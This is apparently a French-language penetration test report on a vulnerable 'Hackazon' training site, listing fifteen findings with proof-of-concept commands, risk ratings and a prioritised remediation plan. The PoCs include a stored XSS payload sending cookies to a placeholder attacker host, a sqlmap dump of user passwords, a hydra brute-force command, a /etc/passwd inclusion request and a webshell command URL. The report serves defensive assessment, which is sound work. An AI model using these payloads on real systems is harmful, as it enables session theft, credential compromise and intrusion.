# Rapport d’évaluation de sécurité – Site web Hackathon

**Confidentiel – Diffusion restreinte**
**Version :** 1.2 (technique enrichie)
**Date :** 19/10/2025

---

## 1. Préambule

### 1.1 Présentation des résultats

Ce rapport présente les résultats de l’évaluation de la sécurité du site web *Hackathon*. Il contient : synthèse managériale, synthèse technique, PoC bruts (commandes / sorties), vulnérabilités identifiées, risques associés, recommandations et plan de remédiation priorisé.

### 1.2 Contexte

Mission réalisée dans le cadre d’un test d’intrusion externe + revue applicative (blackbox + greybox).
**Périmètre :** domaine principal + API.
**Période :** 10 → 19/10/2025.

### 1.3 Équipe & méthodologie

* **Client :** Mr Robin
* **Équipe :** Ryan Rais, Mehdi Lacher
* **Méthodologie :** OWASP Testing Guide v4, ANSSI, CIS Benchmarks.
* **Outils :** Nmap, dirsearch, Burp Suite, OWASP ZAP, sqlmap, hydra, ffuf, curl, jq.

---

## 2. Synthèse managériale

* **État général :** plusieurs failles **critiques** (SQLi, IDOR, Upload exécutable → RCE, XSS) combinées permettent une compromission complète.
* **Actions immédiates recommandées :**

  * Bloquer ou restreindre Swagger.
  * Désactiver l’upload exécutable.
  * Appliquer un WAF (SQLi / XSS).
  * Corriger les IDOR.
* **Re-test :** sous 2 à 4 semaines après correctifs critiques.

---

## 3. Synthèse technique

* **Technologies détectées :** Nginx, PHP 5.6.40, Laravel, MySQL, Apache (port 9002), JS, Bootstrap.
* **Ports notables :** 80, 443, 1234 (SSH), 9002 (Apache).
* **Swagger exposé :** `/swagger.json`.
* **Cookies :** PHPSESSID sans HttpOnly.
* **Type de test :** blackbox + greybox.

---

## 4. Résultats détaillés & PoC bruts

### 4.1 Scan réseau / services

```bash
nmap -sV -sC hackazon.trackflaw.com
443/tcp  open  ssl/http nginx
1234/tcp open  ssh  OpenSSH 10.0p2 Debian 5
9002/tcp open  http Apache 2.4.56 ((Debian))
```

### 4.2 Découverte web (dirsearch)

```bash
dirsearch -u https://hackazon.trackflaw.com/
302 - /admin  -> /admin/user/login
```

### 4.3 API Discovery (Swagger)

* `/api/auth`, `/api/product`, `/api/user/me`, `/api/cart/my`
  *→ Cartographie complète de l’API publique.*

---

## 5. Vulnérabilités détaillées

Chaque vulnérabilité est décrite avec : **Exploitation**, **Impact**, **Criticité**, **Remédiation**, **Priorité**.

### V-001 — Injection SQL

```bash
sqlmap -u "https://hackazon.trackflaw.com/product/view?id=64%67" -D hackazon -T tbl_users -C username,password --dump
```

**Impact :** Extraction des hashes et compromission base utilisateurs.
**Criticité :** Critique
**Remédiation :** Requêtes préparées, validation d’entrée, WAF anti-SQLi, journalisation.
**Priorité :** J+0

---

### V-002 — IDOR / Contrôle d’accès manquant

```bash
curl -X GET -H "Authorization: Token ..." https://hackazon.trackflaw.com/api/user/14
```

**Impact :** Modification de comptes d’autres utilisateurs.
**Criticité :** Critique
**Remédiation :** Vérification ownership, RBAC, refus 403 non autorisés.
**Priorité :** J+0

---

### V-003 — Upload non restreint → RCE

**PoC :** Upload webshell `.php` → `/user_pictures/zebi.php?cmd=ls`

**Impact :** RCE sous www-data.
**Criticité :** Critique
**Remédiation :** Interdire exécution dans `/uploads`, stocker hors webroot, filtrer MIME/extension, scanner fichiers.
**Priorité :** J+0

---

### V-004 — XSS stocké (Contact / FAQ)

```html
<script>fetch('http://attacker:8080/?cookie='+document.cookie)</script>
```

**Impact :** Vol de session et usurpation.
**Criticité :** Critique
**Remédiation :** Encoder sorties, CSP restrictive, cookies HttpOnly.
**Priorité :** J+0 → J+7

---

### V-005 — Brute-force sans limitation

```bash
hydra -l test_user -P rockyou.txt hackazon.trackflaw.com https-post-form "/user/login:username=test_user&password=^PASS^:F=incorrect"
```

**Impact :** Compromission de comptes faibles.
**Criticité :** Critique
**Remédiation :** Rate limiting, backoff exponentiel, 2FA, journalisation.
**Priorité :** J+0

---

### V-006 — LFI (Local File Inclusion)

```bash
help_articles?page=/etc/passwd%00
```

**Impact :** Lecture de fichiers système sensibles.
**Criticité :** Critique
**Remédiation :** Liste blanche de pages, bloquer `../`, vérifier `realpath()`.
**Priorité :** J+0 → J+7

---

### V-007 — Command Injection

**Impact :** Exécution de commandes système.
**Criticité :** Critique
**Remédiation :** Éviter `system()`, valider les arguments, sandbox.
**Priorité :** J+0

---

### V-008 — Cookies non sécurisés

**Impact :** Vol / rejeu de session.
**Criticité :** Moyen
**Remédiation :** `HttpOnly; Secure; SameSite=Lax`, rotation post-login.
**Priorité :** J+0 → J+7

---

### V-009 — Headers sécurité manquants

**Impact :** Fingerprint, clickjacking.
**Criticité :** Moyen
**Remédiation :** HSTS, CSP, X-Frame-Options, masquer `X-Powered-By`.
**Priorité :** J+0 → J+30

---

### V-010 — Swagger exposé en production

**Impact :** Découverte des endpoints sensibles.
**Criticité :** Moyen
**Remédiation :** Supprimer ou restreindre swagger.json.
**Priorité :** J+0

---

### V-011 — Directory Listing (port 9002)

**Impact :** Révélation de fichiers sensibles.
**Criticité :** Moyen
**Remédiation :** `Options -Indexes`, restreindre IP.
**Priorité :** J+0

---

### V-012 — Mots de passe faibles

**Impact :** Compromission de comptes.
**Criticité :** Critique
**Remédiation :** Politique ANSSI (12+ caractères), denylist, 2FA.
**Priorité :** J+0 → J+30

---

### V-013 — Absence de validation e-mail

**Impact :** Faux comptes / spam.
**Criticité :** Moyen
**Remédiation :** Double opt-in par lien unique.
**Priorité :** J+8 → J+30

---

### V-014 — Pas de changement de mot de passe

**Impact :** Faible hygiène de sécurité.
**Criticité :** Faible
**Remédiation :** Fonction « changer mot de passe », rotation de session.
**Priorité :** J+31 → J+60

---

### V-015 — Messages d’erreur verbeux

**Impact :** Fingerprinting serveur.
**Criticité :** Faible
**Remédiation :** `display_errors=Off`, pages d’erreur génériques.
**Priorité :** J+0 → J+30

---

## 6. Tableau récapitulatif

| ID    | Vulnérabilité             | Exploitabilité         | Impact                      | Criticité | Priorité  |
| ----- | ------------------------- | ---------------------- | --------------------------- | --------: | --------- |
| V-001 | SQLi (product/view)       | Élevée (sqlmap)        | Base données compromise     |  Critique | Immédiate |
| V-002 | IDOR / Broken AC          | Élevée (curl/PUT mass) | Altération massives comptes |  Critique | Immédiate |
| V-003 | Upload → RCE              | Élevée (webshell)      | RCE / exfiltration          |  Critique | Immédiate |
| V-004 | XSS stocké                | Moyenne→Élevée         | Vol de session, usurpation  |  Critique | Haute     |
| V-005 | Brute-force               | Élevée (hydra)         | Compromission comptes       |  Critique | Immédiate |
| V-006 | LFI                       | Moyenne                | Lecture fichiers sensibles  |  Critique | Haute     |
| V-007 | Command Injection         | Moyenne→Élevée         | RCE                         |  Critique | Immédiate |
| V-008 | Cookies non sécurisés     | Moyenne                | Vol/rejeu de session        |     Moyen | Haute     |
| V-009 | Headers manquants         | Faible→Moyenne         | Facilite attaques ciblées   |     Moyen | Moyenne   |
| V-010 | Swagger exposé            | Moyenne                | Facilite reconnaissance     |     Moyen | Moyenne   |
| V-011 | Directory listing         | Moyenne                | Reconnaissance/artefacts    |     Moyen | Moyenne   |
| V-012 | MDP faibles               | Élevée                 | Account compromise          |  Critique | Immédiate |
| V-013 | Validation e-mail absente | Faible→Moyenne         | Usurpation/spam             |     Moyen | Moyenne   |
| V-014 | Pas de changement MDP     | Faible                 | UX / sécurité post-fuite    |    Faible | Basse     |
| V-015 | Erreurs verbeuses         | Faible                 | Reconnaissance              |    Faible | Basse     |

---

## 7. Plan d’action

### J+0 → J+7

* Désactiver upload exécutable (ou mettre restriction immédiate).
* Bloquer /swagger.json en prod (ou restreindre par IP/auth).
* Appliquer WAF règles basiques SQLi / XSS.
* Forcer cookies HttpOnly; Secure; SameSite via config serveur.
* Activer Options -Indexes sur Apache/port 9002.
* Mettre en place rate limiting/auth lockout sur endpoint login.

### J+8 → J+30

* Corriger SQLi à la source (requêtes préparées/ORM).
* Corriger IDOR (vérification ownership + RBAC).
* Implémenter validation d’email / double opt-in.
* Introduire politique mot de passe (ANSSI) + HIBP check.
* Masquer bannières serveur / mettre à jour PHP (>=8.2).

### J+31 → J+60

* Intégrer DAST & SAST en CI (ZAP headless, SAST).
* Tests unitaires d’autorisation (horizontal/vertical).
* Centraliser logs + alerting (SIEM basique).
* Scans réguliers WAF + tuning.
* Re-tests d’intrusion après corrections.

---

## 8. Checklist rapide
* Uploads : whitelist MIME, magic bytes, stockage hors webroot, scan AV,  php_admin_flag engine Off.
* DB : requêtes paramétrées, least-privilege DB user, backups chiffrés.
* Auth : limiter tentatives, 2FA pour admins, politique mot de passe.
* Sessions : HttpOnly, Secure, SameSite, rotation.
* Headers : HSTS, CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy.
* Swagger : pas en prod ou protégé.
* Monitoring : alertes sur échecs auth, logs d’accès refusé, intégrité fichiers.
* Dev: code review sécurité, dependabot, tests SAST.

---

## 9. Conclusion

Les vulnérabilités critiques doivent être corrigées immédiatement. Ce rapport technique enrichi fournit toutes les preuves, impacts et remédiations nécessaires à une correction efficace.

**Fait par :** Équipe Audit Sécurité – Hackathon Team
**Date :** 19/10/2025
